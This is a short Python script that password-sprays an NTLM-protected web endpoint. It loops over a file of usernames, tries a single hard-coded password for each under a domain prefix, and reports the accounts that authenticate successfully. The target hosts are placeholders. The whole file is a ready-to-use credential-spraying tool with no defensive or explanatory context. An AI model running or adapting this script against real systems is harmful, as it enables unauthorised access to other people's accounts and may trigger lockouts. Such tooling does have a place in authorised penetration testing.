import requests
from requests_ntlm import HttpNtlmAuth
# pip install requests-ntlm

def try_authentication(url, fqdn, username_file, password):
    print("Starting authentication attempts...\n")
    try:
        with open(username_file, "r") as file:
            usernames = file.read().splitlines()
        for user in usernames:
            try:
                response = requests.get(url, auth=HttpNtlmAuth(f"{fqdn}\\{user}", password))
                if response.status_code == 200:
                    print(f"[SUCCESS] Username: {user} | Status Code: {response.status_code}")
                else:
                    continue
                    # print(f"[FAILURE] Username: {user} | Status Code: {response.status_code}")
            except Exception as e:
                print(f"[ERROR] Username: {user} | Error: {e}")
    except FileNotFoundError:
        print(f"[ERROR] The file '{username_file}' was not found.")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")

url = "http://ntlm.auth.endpoint.foo/"
fqdn = "some.domain.foo"
username_file = "<path to>/usernames.txt"
password = "Enchilada"

try_authentication(url, fqdn, username_file, password)
